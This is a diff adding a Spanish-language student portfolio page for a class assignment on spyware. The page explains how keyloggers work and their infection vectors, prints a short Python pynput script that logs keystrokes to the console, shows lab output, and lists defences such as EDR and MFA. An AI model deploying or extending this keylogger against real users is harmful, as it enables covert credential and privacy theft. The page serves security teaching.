@@ -1,0 +1,285 @@
+---
+import Layout from "../../layouts/Layout.astro"
+import SectionContainer from "../../components/SectionContainer.astro"
+import TitleSection from "../../components/TitleSection.astro"
+import CodeIcon from "../../components/Icons/Code.astro"
+import Link from "../../components/Icons/Link.astro"
+
+// ── Íconos
+import Shield from "../../components/Icons/Shield.astro"
+import Bolt from "../../components/Icons/Bolt.astro"
+import Security from "../../components/Icons/Security.astro"
+import Spy from "../../components/Icons/Spy.astro"
+import Key from "../../components/Icons/Key.astro"
+import Bug from "../../components/Icons/Virus.astro" 
+import Settings from "../../components/Icons/Settings.astro"
+
+const INFO_TAREA = {
+  titulo: "Actividad 12: Spyware — Análisis y Desarrollo de un Keylogger",
+  fecha: "26 de Marzo, 2026",
+  descripcion: "Análisis práctico del comportamiento de un software espía (Spyware). Desarrollo y ejecución en un entorno controlado de un Keylogger escrito en Python capaz de interceptar y registrar eventos del teclado a nivel de sistema operativo.",
+  pdf: "/pdfs/182217-Act12.pdf",
+  imagen1: "/projects/Imagen1Tarea12.jpg"
+}
+---
+
+<Layout
+  title={`Portafolio - ${INFO_TAREA.titulo}`}
+  description={INFO_TAREA.descripcion}
+>
+  <style>
+    :global(header) {
+      display: none !important;
+    }
+  </style>
+
+  <main class="px-4">
+    <SectionContainer class="py-16 md:py-20">
+
+      {/* --- ENCABEZADO --- */}
+      <TitleSection>
+        <CodeIcon class="size-8" />
+        {INFO_TAREA.titulo}
+      </TitleSection>
+
+      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
+        📅 Entregado el: {INFO_TAREA.fecha}
+      </p>
+
+      {/* Banner THREAT LEVEL */}
+      <div class="mb-10 flex items-center gap-3 px-4 py-3 rounded-lg bg-purple-900/20 border border-purple-500/30">
+        <Spy class="size-5 text-purple-400 shrink-0 animate-pulse" />
+        <p class="text-purple-300 text-sm font-medium">
+          Módulo de Malware: Explotación de la confidencialidad mediante captura de periféricos (Hardware Interception).
+        </p>
+        <span class="ml-auto text-xs font-mono text-purple-500/60 hidden sm:block">TYPE: SPYWARE</span>
+      </div>
+
+      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">
+
+        {/* ── CONCEPTO CLAVE ── */}
+        <div>
+          <p class="text-xs font-mono text-gray-500 mb-1">// FUNDAMENTO TEÓRICO</p>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">¿Qué es un Keylogger?</h3>
+          <p>
+            Un <strong>Keylogger</strong> (Registrador de teclas) es un tipo de software o dispositivo de hardware diseñado para interceptar, registrar y almacenar cada pulsación de tecla realizada por el usuario en su teclado, a menudo operando de manera encubierta en el sistema operativo.
+          </p>
+          <p class="mt-3">
+            Dentro de la clasificación de malware, los keyloggers entran en la categoría de <strong>Spyware</strong> (software espía). Su objetivo principal no es destruir el sistema (como lo haría un ransomware o un virus), sino recopilar información sensible de manera silenciosa: credenciales de acceso, datos bancarios, correos electrónicos y conversaciones privadas. Al operar en segundo plano, suponen una de las amenazas más críticas para el pilar de la <strong>Confidencialidad</strong>.
+          </p>
+        </div>
+
+        {/* ── FUNCIONAMIENTO Y VECTORES ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Bug class="size-6 text-purple-400" />
+            Mecánica del Ataque y Componentes
+          </h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-purple-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Settings class="size-5 text-purple-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Intercepción de API del SO</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                A nivel de software, el keylogger utiliza funciones nativas (API hooks) del sistema operativo (como Windows API) para registrarse como un proceso oyente (Listener). Esto le permite capturar el evento físico antes de que llegue a la aplicación destino (navegador, procesador de texto, etc.).
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-red-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Bolt class="size-5 text-red-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Vectores de Infección</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Se distribuyen frecuentemente mediante técnicas de Ingeniería Social (campañas de Phishing), archivos adjuntos maliciosos, descargas silenciosas (drive-by downloads) en sitios web vulnerados, o troyanos ocultos en software aparentemente legítimo.
+              </p>
+            </div>
+
+          </div>
+        </div>
+
+        {/* ── CÓDIGO FUENTE DEL PAYLOAD ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Código Fuente del Payload</h3>
+          <p class="mb-4 text-sm text-gray-400">
+            A continuación se presenta el script en Python desarrollado para esta práctica. Utiliza la librería <code>pynput</code> para engancharse a los eventos del teclado del sistema operativo:
+          </p>
+
+          <div class="relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">python — payload_keylogger.py</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-purple-400">from</span> pynput <span class="text-purple-400">import</span> keyboard
+
+<span class="text-blue-400">def</span> <span class="text-yellow-200">on_press</span>(key):
+    <span class="text-purple-400">try</span>:
+        <span class="text-yellow-300">print</span>(<span class="text-green-400">f'Alphanumeric key pressed: </span><span class="text-orange-300">&#123;</span>key.char<span class="text-orange-300">&#125;</span><span class="text-green-400">'</span>)
+    <span class="text-purple-400">except</span> <span class="text-orange-300">AttributeError</span>:
+        <span class="text-yellow-300">print</span>(<span class="text-green-400">f'Special key pressed: </span><span class="text-orange-300">&#123;</span>key<span class="text-orange-300">&#125;</span><span class="text-green-400">'</span>)
+
+<span class="text-blue-400">def</span> <span class="text-yellow-200">on_release</span>(key):
+    <span class="text-yellow-300">print</span>(<span class="text-green-400">f'Key released: </span><span class="text-orange-300">&#123;</span>key<span class="text-orange-300">&#125;</span><span class="text-green-400">'</span>)
+    <span class="text-purple-400">if</span> key == keyboard.Key.esc:
+        <span class="text-gray-500"># Detener el listener al presionar ESC</span>
+        <span class="text-purple-400">return</span> <span class="text-orange-400">False</span>
+
+<span class="text-gray-500"># Recolectar eventos en segundo plano hasta que se libere</span>
+<span class="text-purple-400">with</span> keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) <span class="text-purple-400">as</span> listener:
+    listener.join()
+              </pre>
+            </div>
+          </div>
+        </div>
+
+        {/* ── ANÁLISIS EXPLICATIVO DEL CÓDIGO FUENTE ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Key class="size-6 text-blue-400" />
+            Análisis de Arquitectura del Código Fuente
+          </h3>
+          <p class="text-sm text-gray-400 mb-4">
+            El núcleo del script desarrollado se fundamenta en la programación orientada a eventos asíncronos para interceptar las interrupciones del teclado sin congelar el flujo principal del sistema:
+          </p>
+          <div class="space-y-4">
+            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
+              <span class="font-mono text-xs text-blue-400 block mb-1">1. Manejo de Eventos Avanzados (pynput)</span>
+              <p class="text-xs text-gray-400 leading-relaxed">
+                A diferencia de funciones secuenciales de lectura de entradas (como <code class="text-purple-300">input()</code>), la librería utilizada interactúa directamente con el subsistema de ventanas del sistema operativo, permitiendo capturar datos en segundo plano (*Background Listening*) de forma global, incluso si la consola de ejecución pierde el foco.
+              </p>
+            </div>
+            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
+              <span class="font-mono text-xs text-purple-400 block mb-1">2. Funciones Callback Orientadas al Flujo</span>
+              <p class="text-xs text-gray-400 leading-relaxed">
+                El script implementa dos bloques de lógica modularizada:
+                <ul class="list-disc pl-5 mt-1 space-y-1 text-gray-400">
+                  <li><code class="text-yellow-300">on_press(key)</code>: Se dispara de forma asíncrona cada vez que el sistema detecta que un interruptor físico del teclado cierra el circuito. Evalúa la tecla mediante bloques condicionales para determinar si se trata de una tecla alfanumérica estándar o una tecla especial de control corporativa.</li>
+                  <li><code class="text-yellow-300">on_release(key)</code>: Monitorea el evento de liberación de presión, permitiendo implementar un mecanismo de escape condicional para detener el proceso de escucha de forma controlada.</li>
+                </ul>
+              </p>
+            </div>
+            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
+              <span class="font-mono text-xs text-green-400 block mb-1">3. Gestión de Hilos de Ejecución (Listener)</span>
+              <p class="text-xs text-gray-400 leading-relaxed">
+                La instanciación estructurada a través de un bloque de control de contexto (<code class="text-green-300">with Listener(...) as listener:</code>) e inicializada mediante <code class="text-green-300">listener.join()</code> genera un hilo (*Thread*) dedicado exclusivamente a la escucha del hardware, bloqueando el hilo principal para mantener la persistencia y la estabilidad del proceso espía.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── TERMINAL MOCKUP: EJECUCIÓN DEL SCRIPT PYTHON ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Laboratorio: Ejecución en Consola</h3>
+          <p class="mb-4 text-sm text-gray-400">
+            A continuación se muestra la salida real de la captura de pulsaciones tras ejecutar el script en el entorno de pruebas:
+          </p>
+
+          <div class="relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">PowerShell — Execution</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-blue-400">PS C:\Users\Wippocramento></span> python payload_keylogger.py
+
+<span class="text-gray-500"># Captura de eventos del sistema en tiempo real...</span>
+<span class="text-purple-400">Special key pressed: Key.caps_lock</span>
+<span class="text-gray-400">Key released: Key.caps_lock</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'e'</span>
+<span class="text-gray-400">Key released: 'e'</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'n'</span>
+<span class="text-gray-400">Key released: 'n'</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'i'</span>
+<span class="text-gray-400">Key released: 'i'</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'g'</span>
+<span class="text-gray-400">Key released: 'g'</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'm'</span>
+<span class="text-gray-400">Key released: 'm'</span>
+
+<span class="text-green-400">Alphanumeric key pressed: 'a'</span>
+<span class="text-gray-400">Key released: 'a'</span>
+<span class="animate-pulse">_</span>
+              </pre>
+            </div>
+          </div>
+          <p class="mt-3 text-xs text-gray-500 italic">
+            * Nota: Como se observa en la salida, la librería diferencia entre teclas de caracteres alfanuméricos y teclas especiales del sistema (como Bloq Mayús, Shift o Enter), permitiendo a un atacante reconstruir contraseñas o comandos exactos.
+          </p>
+        </div>
+
+        {/* ── DEFENSA Y MITIGACIÓN ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Shield class="size-6 text-green-400" />
+            Estrategias de Mitigación y Defensa
+          </h3>
+          <div class="space-y-3 bg-gray-900/40 p-5 rounded-xl border border-gray-800">
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-green-400 font-mono font-bold whitespace-nowrap">[EDR / AV]</span>
+              <p class="text-gray-300">Implementar soluciones de seguridad Endpoint (Antivirus y EDR) basadas en análisis heurístico y de comportamiento para detectar la inyección de "hooks" anómalos en los procesos del teclado.</p>
+            </div>
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-blue-400 font-mono font-bold whitespace-nowrap">[MFA/2FA]</span>
+              <p class="text-gray-300">El uso de Autenticación Multifactor mitiga drásticamente el impacto de un keylogger. Incluso si el spyware captura la contraseña maestra, el atacante no podrá acceder sin el token temporal generado en un dispositivo externo.</p>
+            </div>
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-yellow-400 font-mono font-bold whitespace-nowrap">[KEYBOARDS]</span>
+              <p class="text-gray-300">Para sistemas de altísima seguridad o transacciones bancarias, el uso de teclados virtuales dinámicos (en pantalla) puede evadir keyloggers basados estrictamente en interrupciones de hardware.</p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── EVIDENCIA VISUAL ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80">Evidencia del Laboratorio</h3>
+          <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+            <img 
+              class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
+              src={INFO_TAREA.imagen1} 
+              alt="Ejecución de Keylogger en consola" 
+            />
+            <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+              Figura 1: Captura de pantalla que muestra la intercepción de eventos de teclado (on_press / on_release) mediante Python.
+            </figcaption>
+          </figure>
+        </div>
+
+      </div>
+
+      {/* --- ZONA DE DESCARGA Y RETORNO --- */}
+      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
+        <a 
+          href={INFO_TAREA.pdf} 
+          download="182217-Act12.pdf" 
+          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-blue-600 rounded-full hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-500/30"
+        >
+          <Link class="size-5" />
+          Descargar PDF de la Tarea
+        </a>
+        <a 
+          href="/#tareas" 
+          class="text-gray-500 hover:text-blue-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
+        >
+          ← Regresar a la lista de tareas
+        </a>
+      </div>
+
+    </SectionContainer>
+  </main>
+</Layout>
